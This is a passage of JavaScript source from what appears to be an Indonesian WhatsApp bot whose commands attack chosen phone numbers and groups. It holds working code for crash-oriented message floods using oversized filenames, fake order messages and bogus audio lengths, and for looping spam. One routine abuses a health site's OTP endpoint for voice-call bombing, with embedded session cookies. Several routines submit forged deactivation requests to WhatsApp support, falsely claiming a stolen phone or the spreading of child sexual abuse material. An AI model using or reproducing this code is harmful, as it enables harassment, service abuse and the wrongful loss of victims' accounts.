n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
ZassTdr.sendMessage(prrkek, { document: thumb, caption: "Bot Bug🔥`", fileName: `Bot Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Naufal 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
ZassTdr.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Naufal 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Naufal 😈`",
"message": `${button}`,
"sellerJid": "6283148278021@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
ZassTdr.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
ZassTdr.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "NaufalHost 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
ZassTdr.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
ZassTdr.sendMessage(from, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Naufal 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break


case 'unlitet': case '🌷': case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '☠️': case '👻': case '🐦': case '🗿':  {
if (!isPremium && !isCreator) return reply(mess.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████████████》100%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████████████》100%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████████████》100%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000) 
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
ZassTdr.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
}
ZassTdr.sendMessage(from, { text: `*SEND SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Naufal 😈`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@Naufal", 
"sourceUrl": "https://youtube.com/@Naufal" }}}, { quoted: m })
}
break


case "call":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +628xxx`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
}
break
case "out": case "verif":{
if (!isPremium && !isCreator) return reply(mess.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
